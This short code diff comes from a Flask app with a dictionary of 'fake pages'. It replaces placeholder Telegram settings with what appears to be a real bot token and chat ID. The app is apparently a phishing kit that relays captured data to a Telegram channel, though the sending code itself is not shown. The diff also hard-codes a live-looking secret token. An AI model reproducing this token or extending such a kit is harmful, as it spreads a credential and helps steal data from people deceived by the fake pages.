@@ -3,8 +3,8 @@ import random, string, os, requests
 
 app = Flask(__name__)
 
-TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN'
-CHAT_ID = 'YOUR_CHAT_ID'
+TELEGRAM_TOKEN = '7467918610:AAHYfUOj76AliAsyj4n8VHF0vroAtHNyX18'
+CHAT_ID = '7006569478'
 
 # All fake pages
 fake_pages = {
